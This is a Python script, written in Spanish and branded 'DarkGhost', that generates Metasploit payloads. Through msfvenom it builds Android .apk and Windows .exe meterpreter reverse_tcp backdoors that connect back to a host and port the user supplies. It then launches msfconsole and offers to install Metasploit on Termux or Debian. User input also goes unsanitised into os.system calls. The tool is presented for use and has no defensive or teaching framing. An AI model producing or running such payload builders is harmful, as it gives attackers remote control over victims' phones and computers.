#!/usr/bin/python
#-*- coding:utf8-*-

import os,sys,time

import socket

blanco = '\u001b[30m'
rojo = '\u001b[31m'
verde = '\u001b[32m'
amarillo = '\u001b[33m'
azul = '\u001b[34m'
magenta = '\u001b[35m'
cyan = '\u001b[36m'
blanco = '\u001b[37m'






def entrada1():
	os.system("clear")
	print (rojo+"Tu direccion ip es: ")
	direccion()
	host = input(blanco+"Direccion IP/host: ")
	port = input("Puerto alojado(8080): ")
	nombre = input("Nombre del archivo: ")

	print (rojo+"Usaremos los siguientes párametros [msfvenom -p android/meterpreter/reverse_tcp LHOST="+ str(host) +" LPORT="+ str(port) +" R > "+ str(nombre) +".apk] ")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ str(host) +" LPORT="+ str(port) +" R > "+ str(nombre) +".apk")

	os.system("msfconsole")

def direccion():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	print(cyan+s.getsockname()[0])

def entrada2():
	os.system("clear")
	print (verde+"Tu direccion ip es: ")
	direccion()
	host = input(blanco+"Direccion IP/host: ")
	port = input("Puerto alojado(8080): ")
	nombre = input("Nombre del archivo: ")

	print (amarillo +"Usaremos los siguientes párametros [msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ host +" LPORT="+ port +" R > "+ nombre +".exe] ")
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ host +" LPORT="+ port +" R > "+ nombre +".exe")

	os.system("msfconsole")	

def entrada3():
	os.system("clear")
	print (rojo+"""
___________$b__Vb.
___________’$b__V$b.
____________$$b__V$$b.
____________’$$b._V$$$$oooooooo._________..
_____________’$$P*_V$$$$$”"**$$$b.____.o$$P
______________”_.oooZ$$$$b..o$$$$$$$$$$$$C
______________.$$$$$$$$$$$$$$$$$$$$$$$$$$$b.
______________$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
________.o$$$o$$$$$$$$P”"*$$$$$$$$$P”"”*$$$P
_______.$$$**$$$$P”q$C____”$$$b________.$$P
_______$$P___”$$$b__”$_._.$$$$$b.______*”
_______$$______$$$._____”***$$$$$$$b._A.
_______V$b___._Z$$b.__._______”*$$$$$b$$:
________V$$.__”*$$$b.__b._________”$$$$$
_________”$$b_____”*$.__*b._________”$$$b
___________”$$b._____”L__”$$o.________”*”_____.ooo..
_____________”*$$o.________”*$$o.__________.o$$$$$
_________________”*$$b._______”$$b._______.$$$$$*”
____________________”*$$o.______”$$$o.____$$$$$’
_______________________”$$o_______”$$$b.__”$$$$__
_________________________”$b.______”$$$$b._”$$$$$
________________________._”$$_______”$$$$b__”$$$$
_________________________L.”$.______.$$$$$.__
	""")
	print (amarillo+"solo para Android 7 o superior, teniendo en cuenta un espacion de 500mb minimo")

	ing = str(input(verde+"Empezar: y/n "+blanco))

	if ing == "y" or ing == "Y":
		os.system("clear")
		print (rojo+"[!]Instalando unstable-repo"+verde)
		time.sleep(0.3)
		os.system("pkg install unstable-repo")
		time.sleep(0.2)
		os.system("clear")
		print (rojo+"[!]Instalando METASPLOIT"+verde)
		time.sleep(0.3)
		os.system("pkg install metasploit")

		time.sleep(0.2)
		print("[!]Saliendo")
		time.sleep(0.6)
		exit()

	elif ing == "n" or ing == "N":
		os.system("clear")
		print (verde+"[!]Regresando..")
		time.sleep(0.2)
		os.system("clear")
		print (rojo+"[!]Regresando..")
		time.sleep(0.2)
		os.system("clear")
		print (amarillo+"[!]Regresando..")
		time.sleep(0.2)
		os.system("clear")
		print (rojo+"[!]Regresando..")
		menu()

	else:
		os.system("clear")
		print("Entrada Incorrecta")
		time.sleep(0.3)
		entrada3()
		
def entrada4():
	print(rojo+"Actualizando metasploit")
	os.system("sudo apt install metasploit-framework")
	print(verde+"Sucefull update!")
	time.sleep(0.5)
	menu()

def entrada5():
	os.system("google-chrome https://facebook.com/d4rksit3")
	#os.system("google-chrome https://facebook.com/d4rksit3")










def menu():
	time.sleep(1.2)
	os.system("clear")
	print(rojo+str("                _                  _       _ _   "))
	print(str(rojo+"               | |                | |     (_) |  "))
	print(str(verde+" _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_ "))
	print(str(amarillo+"| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __|"))
	print(str(rojo+"| | | | | |  __/ || (_| \__ \ |_) | | (_) | | |_ "))
	print(str(verde+"|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|"))
	print(str(verde+"                            | |      D4rksit3            "))
	print(str(blanco+"                            |_|                  "+blanco))
	time.sleep(0.2)

	print ("[1]- Payload Android")
	print ("[2]- Payload Pc (Windows) ")
	print ("[3]- Instalar en termux")
	print ("[4]- Actualizar Metasploit (Solo Debian)")
	print ("[5]- Autor")
	print ("[6]- Salir"+verde)


	inp = input("DarkGhost-$ "+blanco)

	if inp == "1":
		entrada1()

	elif inp == "2":
	
		entrada2()

	elif inp == "3":
		entrada3()

	elif inp == "4":
		entrada4()

	elif inp == "5":
		entrada5()


	elif inp == "6":
		print ("[!]Saliendo")
		time.sleep(0.5)
		exit()

	else:
		os.system("clear")
		time.sleep(0.2)
		print (rojo+"[!] Ingresaste un dato incorrecto")
		time.sleep(2)
		os.system("clear")
		print ("[!]Restaurando")
		time.sleep(2)
		menu()


menu()